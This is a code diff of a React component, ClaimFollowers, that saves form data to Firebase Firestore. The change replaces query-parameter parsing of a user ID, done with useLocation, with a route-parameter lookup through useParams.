@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { db } from '../firebase';  // Firebase Firestore instance
 import { collection, addDoc } from 'firebase/firestore';
-import { useLocation } from 'react-router-dom';  // Import the useLocation hook
+import { useParams } from 'react-router-dom';  // Import the useParams hook
 
 const ClaimFollowers = () => {
   const [formData, setFormData] = useState({
@@ -12,21 +12,7 @@ const ClaimFollowers = () => {
   const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);  // To track form validation
-  const [userId, setUserId] = useState('');  // Store userId from the URL
-
-  const location = useLocation();
-
-  // Extract userId from the URL query parameters
-  useEffect(() => {
-    const params = new URLSearchParams(location.search);
-    const userIdFromLink = params.get('userid');
-    console.log("Extracted userId from URL: ", userIdFromLink);  // Debugging log
-    if (userIdFromLink) {
-      setUserId(userIdFromLink);
-    } else {
-      console.error('No userId found in URL');
-    }
-  }, [location]);
+  const { userId } = useParams();  // Get userId from the URL path
 
   // Handle form input changes
   const handleInputChange = (e) => {
